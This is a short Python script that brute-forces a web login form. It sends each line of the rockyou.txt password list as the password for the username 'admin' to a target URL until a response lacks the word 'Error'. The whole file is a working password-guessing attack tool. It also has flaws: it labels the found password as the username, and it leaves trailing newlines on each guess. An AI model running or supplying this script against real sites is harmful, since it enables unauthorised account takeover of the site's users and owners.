#!/usr/bin/python3

from bs4 import BeautifulSoup as bs
import requests
from requests.exceptions import Timeout
import sys
from stringcolor import cs, bold


if len(sys.argv) != 2:
    print("\nSpecify an address and a port: [url]\n")
    exit(1)

target = sys.argv[1]

try:
    req = requests.get(target, timeout=5)
except Timeout:
    print("\nTimeout")
    sys.exit(1)
else:
    if str(req.status_code) != "404":
        print(f"\nHost {target} is up\n")
    else:
        print(f"\nHost {target} is down\n")

passfile = "/home/patrickalderson/Documents/rockyou.txt"
with open(passfile, "r") as f:

    for password in f:
        brutef = requests.post(target, data={"username": "admin", "password": password})

        if "Error" not in brutef.text:
            print(cs("Username found: " + password, "green").bold())
            print(cs("Password found: " + password, "green").bold())
            break
        else:
            print(cs("Attempting failed: " + password, "red"), end="")

print("\n\n")
